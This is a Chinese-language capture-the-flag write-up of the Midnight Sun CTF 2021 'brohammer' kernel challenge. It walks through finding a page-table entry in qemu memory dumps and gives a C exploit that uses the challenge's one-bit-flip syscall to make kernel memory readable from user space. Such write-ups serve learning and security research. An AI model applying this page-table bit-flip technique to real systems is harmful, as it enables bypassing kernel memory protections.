# [Midnight Sun CTF 2021]  Linux Kernel  本地漏洞复现 

> 很遗憾没有注册个账号现场去打这个题，没有及时拿到这个题目的附件。从各位师傅那里找到的题来复现一下。
>
> 另外hxp的大哥太强了。

### brohammer

#### 0x1 源码分析

```c
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/syscalls.h>

#ifndef __NR_BROHAMMER
#define __NR_BROHAMMER 333
#endif

unsigned long flips = 0;

SYSCALL_DEFINE2(brohammer, long *, addr, long, bit)
{
        if (flips >= 1)
        {
                printk(KERN_INFO "brohammer: nope\n");
                return -EPERM;
        }

        *addr ^= (1ULL << (bit));
        (*(long *) &flips)++;

        return 0;
}
```

内核里有一个新的`syscall`提供给我们一个接口，任意位置翻转一个bit。

#### 0x2 思路分析

由于第一次见，google了一下，找到了[Project Zero rowhammer exploit](https://www.tasteless.eu/post/2018/12/aotw-snow-hammer/)。但是太菜了没细看。

看到了hxp的WP，学到了新的思路。

> 1) The initramfs is loaded in memory at (mostly) the same physical location. Doing `pt -save -ss "this is where the flag will be on the remote host..."` yields: `Found at 0xffff880004e19000`, which is a virtual address in the direct-physical map and means that the string is located at physical address `0x4e19000`.
>
> 2) x86-64 Linux kernel direct-physical map pages are typically of size 2-MiB, and this is accomplished by setting the Page Size bit in the Page Directory Entry (PDE). Thus, the physical address `0x4e19000` is within a 2-Mib-aligned page which starts at `0x4e00000`. By using `gdb-pt-dump` or walking the page table manually one can find the physical address for the corresponding PDE: `0x18fb138`. Thus, the virtual address through the direct physical map is `0xffff8800018fb138`.
>
> 3) Access to memory from user processes is restricted by setting a special bit, called the U/S bit, in the PTE/PDE/PDPE. The bit is found at bit location 2.
>
> The flag can be read through memory by flipping a bit in the specified PDE. For some reason, `puts` would not print out the flag, so the contents had to be read explicitly.

大致步骤如下：

- 使用`gdb-pt-dump`来在内存中搜索flag的字符串，然后找到相关地址，由于亿点搞不懂的原因，我使用`qemu`启动内核的时候，按照原版的脚本打不开，就改成了`-m 512M`来启动，可能是由于这个原因，导致我跟hxp的大哥找到的地址并不一样。

  ![bddebda3e9c7aa98b63deb45429166c6.png](https://img.vaala.cloud/images/2021/04/16/bddebda3e9c7aa98b63deb45429166c6.png)

- 然后去寻找这个地址所在`page`的`page table entry`的地址。

  关于搜索这个`page table entry`地址，可以参考[OverTheWire Advent Bonanza 2018 - Snow Hammer](https://www.tasteless.eu/post/2018/12/aotw-snow-hammer/)

  以下是我的复现过程(直接贴了我每次检索的过程)：

  ```shell
  (qemu) pmemsave 0 0x8000000 memdump
  
  pwndbg > info registers cr3
  0x1fa8a880
  
  0b 1111111111111111 100010000 000000000 000000000 100101100 000000000000
                          0x110 * 8     0           0       0x12c * 8
                          0x880                               0x960
  
  
  ➜  brohammer xxd -e -g8 -c8 -a -s  0x1fa8a880  -l 0x1000 memdump
  1fa8a880: 00000000018fa067  g.......
  1fa8a888: 0000000000000000  ........
  
  ➜  brohammer xxd -e -g8 -c8 -a -s  0x18fa000  -l 0x1000 memdump
  018fa000: 00000000018fb067  g.......
  018fa008: 0000000000000000  ........
  
  ➜  brohammer xxd -e -g8 -c8 -a -s  0x18fb000  -l 0x1000 memdump
  018fb000: 00000000018fc067  g.......
  018fb008: 80000000002001e3  .. .....
  018fb010: 80000000004001e3  ..@.....
  018fb018: 80000000006001e3  ..`.....
  
  ➜  brohammer xxd -e -g8 -c8 -a -s  0x00000000018fc960  -l 0x1000 memdump
  018fc960: 800000000012c163  c.......
  018fc968: 800000000012d163  c.......
  018fc970: 800000000012e163  c.......
  018fc978: 800000000012f163  c.......
  018fc980: 8000000000130163  c.......
  018fc988: 8000000000131163  c.......
  018fc990: 8000000000132163  c!......
  018fc998: 8000000000133163  c1......
  
  0x018fc960 + base = 0xffff8800018fc960
  ```

  最终找到的`page table entry`的地址是`0xffff8800018fc960`，`page table entry`里面内容是`800000000012c163`，我们需要的修改的是倒数第二位，是我们获得权限访问这里来读取`flag`。

  ```
  018fc960: 0b01100011
                 \   \\\_ present
                  \   \\_ not writeable
                   \   \_ not user accessible
                    \____ 2 MiB page (not an index into page table)
  ```

  

- 根据(~~抄~~)hxp大哥的`exp`来写本地复现的`exp`:

  ```c
  #include <stdio.h>
  #include <unistd.h>
  
  int main() {
          int r = syscall(333, 0xffff8800018fc960, 2);
          printf("%d\n", r);
          for (unsigned long i = 0; i < 10; ++i) {
                          unsigned char *addr = (char*)0xffff88000012c000ULL + i * 0x100ULL;
                          if (*addr == 't') {
                          printf("%p: \n", addr);
                          for (unsigned char *j = addr; j < addr + 0x100 && *j; ++j) {
                                  printf("%c", *j);
                          }
                          printf("\n");
                  }
          }
          return 0;
  }
  ```

- Got it

  ```shell
  ══════════════════════════════════════════════════════════════════════════════╝
  / # ./exp
  0
  0xffff88000012c000:
  this is where the flag will be on the remote host...
  
  / # QEMU: Terminated
  ```

### Reference

[Midnightsun CTF 2021: Brohammer](https://hxp.io/blog/82/Midnightsun-CTF-2021-Brohammer/)

[OverTheWire Advent Bonanza 2018 - Snow Hammer](https://www.tasteless.eu/post/2018/12/aotw-snow-hammer/)

